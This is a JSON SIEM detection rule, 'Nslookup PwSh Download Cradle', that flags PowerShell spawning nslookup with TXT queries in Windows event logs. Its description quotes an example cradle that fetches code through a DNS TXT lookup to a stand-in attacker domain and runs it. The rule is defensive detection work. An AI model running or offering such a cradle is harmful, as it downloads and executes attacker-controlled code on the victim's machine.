{"description": "This rule tries to detect powershell download cradles, e.g. powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]", "enabled": false, "false_positives": ["Unknown"], "filters": [], "from": "now-360s", "immutable": false, "index": ["winlogbeat-*"], "interval": "5m", "rule_id": "1c7b43d6-22a3-a23b-3819-c0c7248f9498", "language": "lucene", "max_signals": 100, "risk_score": 35, "name": "Nslookup PwSh Download Cradle", "query": "(process.parent.executable.text:*\\\\powershell.exe AND process.executable.text:*nslookup* AND process.command_line.text:*\\=txt\\ *)", "meta": {"from": "1m"}, "severity": "medium", "tags": ["T1071", "T1105"], "to": "now", "type": "query", "threat": [], "version": 1, "references": ["https://twitter.com/alh4zr3d/status/1566489367232651264"], "timestamp_override": "event.ingested", "author": ["Zach Mathis (@yamatosecurity)"], "license": "https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md"}
